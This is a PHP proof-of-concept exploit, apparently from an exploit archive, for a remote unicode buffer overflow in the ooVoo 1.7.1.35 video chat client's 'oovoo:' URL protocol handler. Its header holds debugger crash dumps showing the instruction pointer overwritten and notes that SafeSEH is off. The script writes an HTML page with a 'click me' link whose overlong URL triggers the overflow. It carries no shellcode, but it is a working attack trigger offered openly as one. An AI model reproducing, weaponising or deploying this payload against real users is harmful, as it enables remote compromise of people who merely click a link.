<?php
/*
ooVoo 1.7.1.35 (URL Protocol) remote unicode buffer overflow poc
by Nine:Situations:Group::bruiser
tested against IE8b/xp sp3

9sg site: http://retrogod.altervista.org/

software site: http://www.oovoo.com/
description: ooVoo is a startup video conferencing and instant messaging
application, similar to Skype Video.[1] ooVoo allows video chats with up to 6
participants, and unlike Skype Video, does not use a P2P network.[..]

faultmon dump of oovoo.exe processing the url given:
...
04:22:10.875  pid=0E10 tid=0C08  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION reading [0000005A])
              ----------------------------------------------------------------
              EAX=00000066: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EBX=00133D44: 6F 00 6F 00 76 00 6F 00-6F 00 3A 00 00 00 0F 00
              ECX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDX=01D0DC28: 63 00 61 00 6C 00 6C 00-74 00 6F 00 3A 00 00 00
              ESP=00133D00: 12 4E 43 00 AA A8 39 06-FF FF FF FF 01 00 00 00
              EBP=00133F68: 63 00 63 00 63 00 64 00-64 00 64 00 64 00 65 00
              ESI=00133F84: 66 00 00 00 68 B6 A2 01-00 00 00 00 00 00 00 00
              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EIP=0040DF5A: 3B 48 F4 7F 16 52 8D 04-48 50 E8 89 9A 3F 00 83
                            --> CMP ECX,[EAX-0C]
              ----------------------------------------------------------------

04:22:12.015  pid=0E10 tid=0C08  EXCEPTION (first-chance)
              ----------------------------------------------------------------
              Exception C0000005 (ACCESS_VIOLATION writing [00000000])
              ----------------------------------------------------------------
              EAX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EBX=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              ECX=00610061: 00 00 00 89 84 24 86 00-00 00 89 84 24 8A 00 00
              EDX=7C9132BC: 8B 4C 24 04 F7 41 04 06-00 00 00 B8 01 00 00 00
              ESP=00133930: A8 32 91 7C 18 3A 13 00-5C 3F 13 00 34 3A 13 00
              EBP=00133950: 00 3A 13 00 7A 32 91 7C-18 3A 13 00 5C 3F 13 00
              ESI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EDI=00000000: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??
              EIP=00610061: 00 00 00 89 84 24 86 00-00 00 89 84 24 8A 00 00
                            --> ADD [EAX],AL
              ----------------------------------------------------------------
...

additional notes:
oovoo.exe, compiled with /SafeSEH=OFF

reg key:
HKEY_CLASSES_ROOT\ooVoo\shell\open\command
"e:\oovoo\oovoo.exe" "%1"

*/
$bof="<html><a target=\"_blank\" href=\"oovoo:?" . str_repeat("\x0f",258).
"bbbbaaaaccccddddeeeeffff".
"\">click me</a></html>";
$fp=fopen("oovoo_poc.html","w+");
fputs($fp,$bof);
fclose($fp);
?>

